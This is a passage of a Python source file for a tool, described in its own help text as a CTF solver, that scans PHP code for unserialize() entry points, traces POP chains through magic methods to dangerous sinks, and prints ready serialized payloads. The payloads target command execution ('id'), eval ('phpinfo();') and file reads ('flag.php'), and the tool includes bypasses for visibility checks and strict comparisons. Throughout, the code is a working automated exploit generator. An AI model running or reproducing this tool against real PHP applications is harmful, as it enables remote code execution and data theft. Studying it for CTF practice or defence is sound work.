        print(f"  发现 {len(self.chains)} 条 POP 利用链!")
        print("=" * 70)

        for i, chain in enumerate(self.chains, 1):
            print(f"\n{'─' * 70}")
            print(f"  POP 链 #{i}")
            print(f"{'─' * 70}")

            print(f"\n  入口: {chain.entry.variable}")
            print(f"  来源: {chain.entry.file}:{chain.entry.line}")
            if chain.constraints:
                print(f"  约束: {', '.join(chain.constraints)}")

            print(f"\n  利用链:")
            for j, (cls, method, trigger) in enumerate(chain.chain):
                prefix = "  →" if j > 0 else "  起点"
                print(f"  {prefix} {cls}::{method}() — {trigger}")

            if chain.sink:
                sink_cls, sink_method, sink_func, sink_desc = chain.sink
                print(f"  终点 → {sink_cls}::{sink_method}() → {sink_func}() [{sink_desc}]")

            if chain.payload_hint:
                print(f"\n  {chain.payload_hint}")

    def _print_manual_hints(self):
        """手动分析提示 — 当自动构建失败时提供指导"""
        print("\n" + "=" * 70)
        print("  手动分析指南")
        print("=" * 70)

        # 按触发顺序排列魔术方法
        print("\n  魔术方法触发顺序（反序列化场景）:")
        print("  unserialize() → __wakeup() → __destruct()")
        print("  其他触发: __toString(字符串化) / __call(不存在方法)")
        print("           __get(不可访问属性) / __invoke(当函数调用)")

        # 列出所有可用的跳板和终点
        for cls_name, cls in self.parser.classes.items():
            magic = [(n, m) for n, m in cls.methods.items() if m.is_magic]
            danger = []
            for m_name, m in cls.methods.items():
                for call in m.calls:
                    if call in DANGEROUS_FUNCTIONS and call != 'unserialize':
                        danger.append((m_name, call))

            if magic or danger:
                print(f"\n  [{cls_name}]")
                if magic:
                    for name, method in magic:
                        calls_str = ', '.join(method.calls[:5]) if method.calls else '无调用'
                        print(f"    跳板: {name}() → 内部调用: {calls_str}")
                if danger:
                    for m_name, func in danger:
                        print(f"    终点: {m_name}() → {func}()")

        # 属性可控性分析
        print("\n  可控属性（反序列化可控制）:")
        for cls_name, cls in self.parser.classes.items():
            for prop in cls.properties.values():
                print(f"    {cls_name}::${prop.name} ({prop.visibility})"
                      + (f" 默认={prop.default_value}" if prop.default_value else ""))


# ============================================================
# 第三层: 载荷生成 — 根据分析结果生成序列化字符串
# ============================================================

class PayloadGenerator:
    """PHP 反序列化载荷生成器"""

    # PHP 序列化格式说明:
    # O:类名长度:"类名":属性数:{属性名;属性值;...}
    # public 属性:    s:N:"属性名"
    # protected 属性: s:N:"\x00*\x00属性名" (含空字节，ASCII 0)
    # private 属性:   s:N:"\x00类名\x00属性名" (含空字节)

    @staticmethod
    def generate_serialized(class_name: str, props: dict,
                            visibility: dict = None,
                            bypass_protected: bool = True) -> str:
        """
        生成 PHP 序列化字符串

        Args:
            class_name: 类名
            props: {属性名: 值} 字典
            visibility: {属性名: 'public'/'protected'/'private'}，默认 public
            bypass_protected: 是否用 public 绕过 protected 的空字节问题 (PHP 7.1+)

        Returns:
            PHP 序列化字符串
        """
        if visibility is None:
            visibility = {}

        parts = []
        for name, value in props.items():
            vis = visibility.get(name, 'public')

            # 属性名编码
            if bypass_protected or vis == 'public':
                attr_name = name
            elif vis == 'protected':
                attr_name = f"\x00*\x00{name}"
            elif vis == 'private':
                attr_name = f"\x00{class_name}\x00{name}"
            else:
                attr_name = name

            parts.append(PayloadGenerator._serialize_value(attr_name))
            parts.append(PayloadGenerator._serialize_value(value))

        prop_count = len(props)
        return f'O:{len(class_name)}:"{class_name}":{prop_count}:{{{"".join(parts)}}}'

    @staticmethod
    def _serialize_value(value) -> str:
        """将 Python 值转为 PHP 序列化格式"""
        if isinstance(value, bool):
            return f'b:{int(value)};'
        elif isinstance(value, int):
            return f'i:{value};'
        elif isinstance(value, float):
            return f'd:{value};'
        elif isinstance(value, str):
            return f's:{len(value)}:"{value}";'
        elif isinstance(value, list):
            items = ''
            for i, item in enumerate(value):
                items += PayloadGenerator._serialize_value(i)
                items += PayloadGenerator._serialize_value(item)
            return f'a:{len(value)}:{{{items}}}'
        elif isinstance(value, dict):
            items = ''
            for k, v in value.items():
                items += PayloadGenerator._serialize_value(k)
                items += PayloadGenerator._serialize_value(v)
            return f'a:{len(value)}:{{{items}}}'
        elif value is None:
            return 'N;'
        else:
            return f's:{len(str(value))}:"{value}";'

    @staticmethod
    def check_is_valid(payload: str) -> tuple:
        """
        检查载荷是否能通过 is_valid() 类检查（所有字符在 ASCII 32-125）

        Returns:
            (pass, invalid_chars) — 是否通过, 不合法字符列表
        """
        invalid = []
        for i, c in enumerate(payload):
            code = ord(c)
            if code < 32 or code > 125:
                invalid.append((i, code, repr(c)))
        return len(invalid) == 0, invalid

    @staticmethod
    def auto_bypass(payload: str, constraints: list) -> str:
        """
        根据约束自动绕过

        策略:
        1. is_valid → protected/private 属性用 public 替代
        2. === 严格比较 → 整数代替字符串
        3. 字符串过滤 → 编码绕过（需具体分析）
        """
        # 如果有 is_valid 约束，检查是否有空字节
        has_is_valid = any('is_valid' in c for c in constraints)

        if has_is_valid:
            valid, invalid_chars = PayloadGenerator.check_is_valid(payload)
            if not valid:
                # 空字节来自 protected/private 属性
                # 已在 generate_serialized 中用 bypass_protected=True 处理
                pass

        return payload


# ============================================================
# 第四层: 报告生成
# ============================================================

class ReportGenerator:
    """分析报告生成器"""

    def __init__(self, analyzer: POPChainAnalyzer):
        self.analyzer = analyzer
        self.parser = analyzer.parser

    def generate(self, output_format: str = 'text') -> str:
        """生成分析报告"""
        if output_format == 'json':
            return self._generate_json()
        return self._generate_text()

    def _generate_text(self) -> str:
        lines = []
        lines.append("=" * 70)
        lines.append("  PHP 反序列化利用链分析报告")
        lines.append("=" * 70)

        # 入口
        lines.append(f"\n反序列化入口: {len(self.parser.entries)} 个")
        for entry in self.parser.entries:
            lines.append(f"  - {entry.file}:{entry.line} → {entry.variable}")
            for v in entry.validation:
                lines.append(f"    约束: {v}")

        # 类结构
        lines.append(f"\n类定义: {len(self.parser.classes)} 个")
        for name, cls in self.parser.classes.items():
            magic = [m for m in cls.methods.values() if m.is_magic]
            danger = []
            for m in cls.methods.values():
                for call in m.calls:
                    if call in DANGEROUS_FUNCTIONS and call != 'unserialize':
                        danger.append(f"{m.name}()→{call}()")

            lines.append(f"  [{name}]" + (f" extends {cls.parent}" if cls.parent else ""))
            lines.append(f"    属性: {len(cls.properties)}, 方法: {len(cls.methods)}")
            if magic:
                lines.append(f"    魔术方法: {', '.join(m.name for m in magic)}")
            if danger:
                lines.append(f"    危险调用: {', '.join(danger)}")

        # POP 链
        lines.append(f"\nPOP 利用链: {len(self.analyzer.chains)} 条")
        for i, chain in enumerate(self.analyzer.chains, 1):
            lines.append(f"\n  --- 链 #{i} ---")
            lines.append(f"  入口: {chain.entry.variable}")
            for cls, method, trigger in chain.chain:
                lines.append(f"  → {cls}::{method}() [{trigger}]")
            if chain.sink:
                lines.append(f"  → 终点: {chain.sink[2]}() [{chain.sink[3]}]")
            if chain.payload_hint:
                lines.append(f"  {chain.payload_hint}")

        # 载荷
        lines.append("\n" + "=" * 70)
        lines.append("  载荷生成")
        lines.append("=" * 70)
        self._generate_payloads(lines)

        return '\n'.join(lines)

    def _generate_payloads(self, lines: list):
        """为每条 POP 链生成载荷"""
        gen = PayloadGenerator()

        for i, chain in enumerate(self.analyzer.chains, 1):
            lines.append(f"\n  POP 链 #{i} 载荷:")

            if not chain.chain:
                continue

            # 从链中提取嵌套结构
            # 例如: StartClass -> MiddleClass -> EndClass
            # 生成: O:10:"StartClass":1:{s:3:"obj";O:11:"MiddleClass":1:{s:7:"handler";O:8:"EndClass":1:{s:3:"cmd";s:4:"id";}}}
            bypass = any('is_valid' in c for c in chain.constraints)
            payload = self._generate_nested_payload(chain, gen, bypass)

            if payload:
                valid, invalid = gen.check_is_valid(payload)
                lines.append(f"    序列化字符串: {payload}")
                lines.append(f"    URL 编码: {quote(payload)}")
                lines.append(f"    is_valid 检查: {'PASS' if valid else 'FAIL'}")
                if invalid:
                    for pos, code, char in invalid[:5]:
                        lines.append(f"      不合法字符 @ pos {pos}: ASCII {code} ({char})")

    def _generate_nested_payload(self, chain: POPChain, gen: 'PayloadGenerator',
                                  bypass_protected: bool) -> Optional[str]:
        """生成嵌套对象的序列化载荷"""
        # 解析链路径，提取类序列和属性赋值
        class_sequence = []  # 有序的类名列表
        prop_assignments = {}  # {(cls, prop) -> assigned_class}

        for cls_name, method_name, trigger in chain.chain:
            # 解析 "$this->prop=ClassName" 或 "$prop=ClassName" 格式
            match = re.match(r'\$(?:this->)?(\w+)=(\w+)', cls_name)
            if match:
                prop_name = match.group(1)
                assigned_cls = match.group(2)
                # 找到前一个实际类名
                if class_sequence:
                    parent_cls = class_sequence[-1]
                    prop_assignments[(parent_cls, prop_name)] = assigned_cls
                continue
            # 普通类名
            if cls_name not in class_sequence:
                class_sequence.append(cls_name)

        if not class_sequence:
            return None

        # 递归构建嵌套序列化
        def build_serialized(cls_name: str, visited_cls: set = None) -> str:
            if visited_cls is None:
                visited_cls = set()

            # 循环引用检测：同一类不能递归嵌套自身
            if cls_name in visited_cls:
                return gen._serialize_value('')  # 循环引用处用空值截断

            cls = self.parser.classes.get(cls_name)
            if not cls:
                return gen._serialize_value('')

            visited_cls = visited_cls | {cls_name}  # 不可变集合，避免兄弟节点互相影响

            parts = []
            for prop_name, prop in cls.properties.items():
                vis = prop.visibility
                attr_name = prop_name if (bypass_protected or vis == 'public') else prop_name
                parts.append(gen._serialize_value(attr_name))

                # 检查是否有嵌套对象
                assign_key = (cls_name, prop_name)
                if assign_key in prop_assignments:
                    nested_cls = prop_assignments[assign_key]
                    parts.append(build_serialized(nested_cls, visited_cls))
                else:
                    val = self._smart_value(prop_name, prop.default_value, chain)
                    parts.append(gen._serialize_value(val))

            return f'O:{len(cls_name)}:"{cls_name}":{len(cls.properties)}:{{{"".join(parts)}}}'

        return build_serialized(class_sequence[0])

    def _smart_value(self, prop_name: str, default: Optional[str], chain: POPChain) -> object:
        """根据属性名和链的终点智能设置值"""
        if not chain.sink:
            return default if default else ''
        sink_func = chain.sink[2]
        name_lower = prop_name.lower()

        # 如果终点是文件读取，filename 类属性设为 flag.php
        if sink_func in ('file_get_contents', 'readfile', 'highlight_file',
                         'show_source', 'file_put_contents', 'include',
                         'include_once', 'require', 'require_once', 'fopen'):
            if 'file' in name_lower or 'name' in name_lower or 'path' in name_lower:
                return 'flag.php'

        # cmd/command/arg 类属性 — 命令执行终点给默认值
        if sink_func in ('system', 'exec', 'passthru', 'shell_exec', 'popen',
                         'proc_open', 'pcntl_exec'):
            if name_lower in ('cmd', 'command', 'arg', 'args', 'exec', 'shell'):
                return 'id'  # 默认命令

        # eval/assert 类属性 — 代码执行终点
        if sink_func in ('eval', 'assert', 'create_function'):
            if name_lower in ('code', 'expr', 'eval', 'content', 'value'):
                return 'phpinfo();'  # 默认验证命令
            # 如果链中有弱类型绕过（===），用整数
            for cls_name, method_name, trigger in chain.chain:
                cls = self.parser.classes.get(cls_name)
                if cls and method_name in cls.methods:
                    method = cls.methods[method_name]
                    if '===' in method.body:
                        # 查找被严格比较的值
                        m = re.search(r'\$this->\w+\s*===\s*["\'](\w+)["\']', method.body)
                        if m:
                            strict_val = m.group(1)
                            try:
                                return int(strict_val)  # 返回整数绕过 ===
                            except ValueError:
                                pass
            return default if default else ''

        # content/data 类属性
        if name_lower in ('content', 'data', 'value', 'text', 'body'):
            return 'x'  # 占位值

        return default if default else ''

    def _generate_json(self) -> str:
        data = {
            'entries': [{
                'file': e.file,
                'line': e.line,
                'variable': e.variable,
                'validation': e.validation
            } for e in self.parser.entries],
            'classes': {},
            'chains': [],
        }

        for name, cls in self.parser.classes.items():
            data['classes'][name] = {
                'parent': cls.parent,
                'properties': {n: {'visibility': p.visibility, 'default': p.default_value}
                              for n, p in cls.properties.items()},
                'methods': {n: {'visibility': m.visibility, 'is_magic': m.is_magic,
                               'calls': m.calls, 'prop_access': m.prop_access}
                           for n, m in cls.methods.items()},
            }

        for chain in self.analyzer.chains:
            data['chains'].append({
                'entry': chain.entry.variable,
                'path': chain.chain,
                'sink': chain.sink,
                'constraints': chain.constraints,
                'hint': chain.payload_hint,
            })

        return json.dumps(data, indent=2, ensure_ascii=False)


# ============================================================
# 主入口
# ============================================================

def main():
    parser_arg = argparse.ArgumentParser(
        description='PHP 反序列化利用链自动分析器 (CTF 解题工具)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  %(prog)s source.php
  %(prog)s file1.php file2.php file3.php
  %(prog)s -d /path/to/php/sources
  %(prog)s -d . -o report.json
        """
    )

    parser_arg.add_argument('files', nargs='*', help='PHP 源码文件路径')
    parser_arg.add_argument('-d', '--dir', help='扫描目录下所有 PHP 文件')
    parser_arg.add_argument('-o', '--output', help='输出报告文件路径')
    parser_arg.add_argument('--json', action='store_true', help='输出 JSON 格式报告')
    parser_arg.add_argument('--depth', type=int, default=8, help='POP 链搜索深度 (默认 8)')
    parser_arg.add_argument('--no-color', action='store_true', help='禁用彩色输出')

    args = parser_arg.parse_args()

    # 收集文件列表
    files = list(args.files)
    if args.dir:
        for root, dirs, filenames in os.walk(args.dir):
            for fn in filenames:
                if fn.endswith('.php'):
                    files.append(os.path.join(root, fn))

    if not files:
        parser_arg.print_help()
        print("\n[!] 请提供至少一个 PHP 源码文件")
        sys.exit(1)

    print(f"[*] 扫描 {len(files)} 个 PHP 文件...")

    # 解析所有文件
    php_parser = PHPSourceParser()
    for filepath in files:
        php_parser.parse_file(filepath)

    # 分析 POP 链
    analyzer = POPChainAnalyzer(php_parser)
    analyzer.max_depth = args.depth
    chains = analyzer.analyze()

    # 生成报告
    reporter = ReportGenerator(analyzer)
    if args.json:
        report = reporter.generate('json')
    else:
        report = reporter.generate('text')

    # 输出
    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        print(f"\n[*] 报告已保存到: {args.output}")
    else:
        print("\n" + report)


if __name__ == '__main__':
    main()
